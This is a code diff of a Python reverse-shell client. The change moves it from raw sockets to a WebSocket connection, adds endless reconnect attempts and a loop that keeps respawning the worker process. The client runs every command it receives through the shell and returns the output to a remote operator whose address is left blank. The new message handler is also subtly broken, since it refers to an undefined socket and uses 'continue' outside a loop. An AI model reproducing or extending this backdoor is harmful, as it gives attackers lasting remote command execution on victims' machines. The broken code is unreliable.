@@ -1,46 +1,58 @@
 import os
+import time
 import socket
+import websocket
 import subprocess
-import sys
+from multiprocessing import Process
 
-def receiver(s):
+address = ""
+
+def on_message(ws, cmd):
     """Receive system commands and execute them."""
-    while True:
-        cmd_bytes = s.recv(4096) # 4096 is better for heavy transfers!
-        cmd = cmd_bytes.decode("utf-8")
-        if cmd.startswith("cd "):
-            os.chdir(cmd[3:])
-            x1 = f'{os.getcwd()}>'
-            s.send(x1.encode())
-            continue
-        if len(cmd) == 2 and ":" in cmd:
-            os.chdir(cmd)
-            x2 = f'{os.getcwd()}>'
-            s.send(x2.encode())
+    if cmd.startswith("cd "):
+        os.chdir(cmd[3:])
+        x1 = f'{os.getcwd()}>'
+        s.send(x1.encode())
+        continue
+    if len(cmd) == 2 and ":" in cmd:
+        os.chdir(cmd)
+        x2 = f'{os.getcwd()}>'
+        s.send(x2.encode())
 
-        if len(cmd) > 0:
-            p = subprocess.run(cmd, shell=True, capture_output=True)
-            data = p.stdout + p.stderr
-            x3 = f'{os.getcwd()}>'
-            s.sendall(data + x3.encode())
+    if len(cmd) > 0:
+        p = subprocess.run(cmd, shell=True, capture_output=True)
+        data = p.stdout + p.stderr
+        x3 = f'{os.getcwd()}>'
+        s.sendall(data + x3.encode())
 
-def connect(address):
+def on_open(ws):
+    print("WebSocket connection established")
+    ws.send(f'{os.getcwd()}>')
+
+def on_close(ws):
+    print("Connection Closed")
+
+def on_error(ws, error):
+    print(error)
+
+def connect():
     """Establish a connection to the address, then call receiver()"""
-    try:
-        s = socket.socket()
-        s.connect(address)
-        print("Connection Established.")
-        print(f"Address: {address}")
-        x5 = f'{os.getcwd()}>'
-        s.send(x5.encode())
-
-    except socket.error as error:
-        print("Something went wrong... more info below.")
-        print(error)
-        sys.exit()
-    receiver(s)
+    while True:
+        try:
+            ws = websocket.WebSocketApp(address, on_open=on_open, on_message=on_message, on_close=on_close, on_error=on_error)
+            ws.run_forever()
+        except Exception as e:
+            print("Connection Error: " + str(e))
+            time.sleep(2)
+            continue
 
 if __name__ == "__main__":
-    host = "127.0.0.1"
-    port = 5050
-    connect((host, port))
+    while True:
+        try:
+            print("Creating new worker...")
+            p = Process(target=connect)
+            p.start()
+            p.join()
+            print("Worker terminated\n")
+        except:
+            ...
